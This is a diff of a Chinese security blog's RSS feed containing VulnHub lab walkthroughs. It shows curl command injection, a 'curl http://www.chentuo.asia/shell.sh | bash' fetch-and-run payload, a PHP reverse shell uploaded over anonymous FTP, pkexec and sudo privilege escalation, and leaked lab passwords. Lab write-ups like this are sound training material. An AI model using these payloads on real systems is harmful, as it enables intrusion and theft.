-&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAy&#34;&gt;http://192.168.31.102&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-582.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.143&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-583.png&#34; width=&#34;250&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 80 端口没有任何发现&lt;/p&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAv&#34;&gt;http://192.168.31.143:8080/&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-584.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.143:8080/&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-585.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 8080 端口存在以下目录&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvbG9naW4=&#34;&gt;http://192.168.31.143:8080/login&lt;/span&gt;&lt;br&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u&#34;&gt;http://192.168.31.143:8080/registration&lt;/span&gt;&lt;br&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvc2VjcmV0&#34;&gt;http://192.168.31.143:8080/secret&lt;/span&gt;&lt;br&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdGVzdA==&#34;&gt;http://192.168.31.143:8080/test&lt;/span&gt;&lt;br&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdXNlcnM=&#34;&gt;http://192.168.31.143:8080/users&lt;/span&gt;&lt;/p&gt;
-&lt;h3 id=&#34;burp-篡改数据包&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burp-篡改数据包&#34;&gt;#&lt;/a&gt; BURP 篡改数据包&lt;/h3&gt;
-&lt;p&gt;查看目录: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvbG9naW4=&#34;&gt;http://192.168.31.143:8080/login&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-586.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;提示请求方法错了，抓包看下数据包：&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-587.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;提示提交方法有问题，换其他的提交方法&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-588.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;提示 username 字段不能为空，那就加上 username 字段&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-589.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 提示内容不理解，换其他目录查看&lt;/p&gt;
-&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u&#34;&gt;http://192.168.31.143:8080/registration&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-590.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;提示请求方法错了，抓包看下数据包：&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-591.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;提示提交方法有问题，换其他的提交方法&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-592.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;提示 username 字段不能为空，那就加上 username 字段&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-593.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 没啥效果，去访问其他页面看看 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvdXNlcnM=&#34;&gt;http://192.168.31.143:8080/users&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-594.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 猜测确实需要 username 和 password 两个字段&lt;/p&gt;
-&lt;h3 id=&#34;content-type-字段利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#content-type-字段利用&#34;&gt;#&lt;/a&gt; Content-Type 字段利用&lt;/h3&gt;
-&lt;p&gt;仔细观察数据包，发现缺少 Content-type 字段：&lt;br&gt;
-application/x-www-form-urlencoded： 窗体数据被编码为名称 / 值对。这是标准的编码格式。&lt;br&gt;
-multipart/form-data： 窗体数据被编码为一条消息，页上的每个控件对应消息中的一个部分。&lt;br&gt;
-text/plain： 窗体数据以纯文本形式进行编码，其中不含任何控件或格式字符。&lt;/p&gt;
-&lt;p&gt;访问目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcmVnaXN0cmF0aW9u&#34;&gt;http://192.168.31.143:8080/registration&lt;/span&gt;&lt;br&gt;
- 添加字段：Content-Type:application/x-www-form-urlencoded&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-595.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;提示变了，password 字段不能为空，再加上 password 字段：&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-596.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;注册成功，那就在 /login 页面登陆一下，要加上用户名和密码：&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-597.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;再访问一些别的页面（现在是在登陆状态中）：&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-598.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 没啥新发现&lt;/p&gt;
-&lt;h3 id=&#34;扩大信息面&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#扩大信息面&#34;&gt;#&lt;/a&gt; 扩大信息面&lt;/h3&gt;
-&lt;p&gt;用更大的字典又扫了一遍目录，发现两个新目录&lt;/p&gt;
-&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvY3JlYXRl&#34;&gt;http://192.168.31.143:8080/create&lt;/span&gt;&lt;br&gt;
-&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcnVu&#34;&gt;http://192.168.31.143:8080/run&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-599.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTQzOjgwODAvcnVu&#34;&gt;http://192.168.31.143:8080/run&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-600.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;提示需要修改请求方法，抓取数据包&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-601.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;修改提交方法为 POST&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-602.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;提示要以 url:port 形式提供要请求的 URL：&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-603.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;格式换成 Content-Type: application/json， 在 ajax 中，如果没加 contentType:“application/json”，那么 data 就对应的是 json 对象；反之，如果加了 contentType:“application/json”，那么 ajax 发送的就是字符串。&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-604.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 现在又提示需要 secret key ，&lt;/p&gt;
-&lt;h3 id=&#34;伪造-access_token&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#伪造-access_token&#34;&gt;#&lt;/a&gt; 伪造 access_token&lt;/h3&gt;
-&lt;p&gt;访问一下 /secret 页面：&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-605.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;登录是失败的，应该是缺少 cookie 的，之前注册成功后，登陆时返回一个 token 值：&lt;br&gt;
- &lt;code&gt;“access_token”:“ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY1MjY4NTY1MCwianRpIjoiODhkNDllNzktNjRlNC00ZWZlLWIyZTItODhlOWJhN2NmNWQ2IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6InRlc3QiLCJuYmYiOjE2NTI2ODU2NTAsImV4cCI6MTY1MjY4NjU1MH0.kwHX8k6JDWCCjoAHtReOPOe3H7CSshM5oXZYl2XpSDo”&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;但是填写 cookie 时是需要一个 key 值的，这个 key 值在尝试 access_token 时是不对的&lt;br&gt;
-翻阅网站，找到以下地址中网站中有个链接&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-606.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;点进去看看，有一些配置信息链接，从中找到了 cookie 的名称&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-607.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;再次提交 cookie，字段名字为 access_token_cookie：&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-608.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 得到 “secret_key”: “commandexecutionissecret”&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;重新梳理一下思路：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;1 .访问registration,login页面，因为Get方式报错，所以改为了Post方式提示&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt;字段缺失，因此增加了该字段，但是无效果&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;2 .访问&lt;span class=&#34;built_in&#34;&gt;users&lt;/span&gt;页面，发现确实需要&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt;和password两个字段&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;3 .重新审查registration数据包，发现缺少Content-Type字段&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;4 .在registration添加字段：Content-Type:application/x-www-form-urlencoded 后成功提交了&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt;数据提示缺少password字段，添加后返回注册成功的消息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;5 .在login中添加Content-Type与&lt;span class=&#34;built_in&#34;&gt;uname&lt;/span&gt;和password后登陆成功，返回了access_token&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;6 .访问run页面，发现需要提交url：port数据，修改Content-Type为json数据后，把url和port提交，提示需要secret_key&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;7.访问secret页面，发现返回错误，推测与login登陆后返回的token有关，但cookies的字段名是不知道的&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;8 .点击网站，搜寻到cookies的字段名为access_token_cookie，将cookies的字段名修改后重新提交到secret页面，返回了secret_key&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;9 .接下来需要访问run界面，并且把上述得到的secret_key加上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;h3 id=&#34;curl-rce-命令执行&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl-rce-命令执行&#34;&gt;#&lt;/a&gt; CURL RCE 命令执行&lt;/h3&gt;
-&lt;p&gt;访问 run 界面，加上 secret_key 字段&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-609.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;返回了比较奇怪的字符串，直接搜索，发现这是 curl 命令执行后的回显&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-610.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;相当于在 curl 后拼接命令，但是管道符号不起作用&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-611.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;后面在加一个分号时成功得到了 whoami 信息，是 RCE 漏洞&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-612.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;尝试往其中写入 shell: &lt;code&gt;curl http://www.chentuo.asia/shell.sh | bash;&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-613.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;尝试:`curl &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5jaGVudHVvLmFzaWEvc2hlbGwuc2g=&#34;&gt;http://www.chentuo.asia/shell.sh&lt;/span&gt; | sh;``&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-614.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 登陆成功，拿到了 patrick 的权限&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-615.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;pkexec-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pkexec-提权&#34;&gt;#&lt;/a&gt; pkexec 提权&lt;/h3&gt;
-&lt;p&gt;服务器存在 s 权限的 pkexec，并且有 gcc 编译器&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-616.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 通过 pkexec 进行提权，成功拿到了 root 权限&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-617.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;配置文件泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#配置文件泄露&#34;&gt;#&lt;/a&gt; 配置文件泄露&lt;/h3&gt;
-&lt;p&gt;看看有没有其他的提权方式，shutdown 可以无密码使用但没法提权&lt;br&gt;
-调用 root 权限的时候是需要 patrick 的密码的，但是我们没密码&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-618.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;找找系统中的文件，看有没有线索，最后在～/flask_blog/app.py 文件中找到一个密码：NOreasonableDOUBTthisPASSWORDisGOOD&lt;br&gt;
-sudo su 使用此密码通过 patrick 来提到 root&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-619.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 提权成功，拿到了 root 权限&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
             <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/129%20PRESIDENTIAL/</guid>
             <title>VULNHUB 29 PRESIDENTIAL</title>
             <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/129%20PRESIDENTIAL/</link>
@@ -918,6 +741,258 @@ john 破解 phpmyadmin 后台时可得到 admin:Stella, &lt;code&gt;su admin&lt;
  ]]></description>
         </item>
         <item>
+            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/124%20HACKABLELL/</guid>
+            <title>VULNHUB 24 HACKABLELL</title>
+            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/124%20HACKABLELL/</link>
+            <category>VULNHUB 21-30</category>
+            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja2FibGUtaWksNzExLw==&#34;&gt;https://www.vulnhub.com/entry/hackable-ii,711/&lt;/span&gt;&lt;br&gt;
+ 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDY4NzYyMS9hcnRpY2xlL2RldGFpbHMvMTE5Mzg2Njgz&#34;&gt;https://blog.csdn.net/weixin_44687621/article/details/119386683&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
+&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
+ 靶机 HACKABLELL：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
+&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
+ &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-564.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.6&lt;/p&gt;
+&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
+ &lt;code&gt;sudo nmap -p- 192.168.31.6&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-565.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机开放端口 21,22,80&lt;/p&gt;
+&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTAyLw==&#34;&gt;http://192.168.31.102/&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-566.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.6&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-567.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;只看到了一个目录，是 files 文件夹，直接访问此链接: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNi9maWxlcy8=&#34;&gt;http://192.168.31.6/files/&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-568.png&#34; width=&#34;330&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看此文件指向地址的详细内容:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNi9maWxlcy9DQUxMLmh0bWw=&#34;&gt;http://192.168.31.6/files/CALL.html&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-569.png&#34; width=&#34;300&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;审查源代码，查看更多的关键信息&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-571.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;网站信息收集之后没有什么关键的信息&lt;/p&gt;
+&lt;h3 id=&#34;ftp-匿名下载上传&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ftp-匿名下载上传&#34;&gt;#&lt;/a&gt; FTP 匿名下载上传&lt;/h3&gt;
+&lt;p&gt;对 ftp 做检查，检测 ftp 服务上是否存在弱口令，是否能搜集到关键信息&lt;/p&gt;
+&lt;p&gt;ftp 192.168.31.6&lt;br&gt;
+get CALL.html&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-572.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;将 CALL.html 文件下载之后查阅，发现和 web 服务是同样的代码&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-573.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;可以控制 ftp 服务向靶机发送 payload，判断是否能上传到网站&lt;br&gt;
+ &lt;code&gt;cp /usr/share/webshells/php/php-reverse-shell.php .&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;修改监听 ip 地址和端口号为攻击机&lt;br&gt;
+ &lt;code&gt;cat shell.php | head -n 55 | tail -n 10&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;连接 ftp，put shell.php 上传文件，打开网址发现 exp 上传成功&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-574.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;点击运行即可成功收到会话，也可以上传一句话木马，使用蚁剑连接&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-575.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;md5-解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#md5-解密&#34;&gt;#&lt;/a&gt; MD5 解密&lt;/h3&gt;
+&lt;p&gt;查看目录下 important.txt 文件，发现根目录有可执行脚本，运行一下&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-577.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;解密这个 md5，得到 onion。猜测这是 ssh 的登录密码&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-578.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;sudopython3提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudopython3提权&#34;&gt;#&lt;/a&gt; sudo (python3) 提权&lt;/h3&gt;
+&lt;p&gt;su shrek 依靠 onion 密码登陆 ssh 成功&lt;br&gt;
+这里使用 python 进行提权，得到 root 身份运行的 shell&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-579.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/127%20TYPO/</guid>
+            <title>VULNHUB 27 TYPO</title>
+            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/127%20TYPO/</link>
+            <category>VULNHUB 21-30</category>
+            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdHlwby0xLDQ3Mi8=&#34;&gt;https://www.vulnhub.com/entry/typo-1,472/&lt;/span&gt;&lt;br&gt;
+ 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaW5mb3NlY2FydGljbGVzLmNvbS90eXBvLTEtdnVsbmh1Yi13YWxrdGhyb3VnaC8=&#34;&gt;https://www.infosecarticles.com/typo-1-vulnhub-walkthrough/&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
+&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
+ 靶机 TYPO：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
+&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
+ &lt;code&gt;sudo arp-sacn -l&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-662.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.153&lt;/p&gt;
+&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
+ &lt;code&gt;sudo nmap -p 192.168.0.153&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-663.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机开放端口 22,80,8000,8080,8081&lt;/p&gt;
+&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
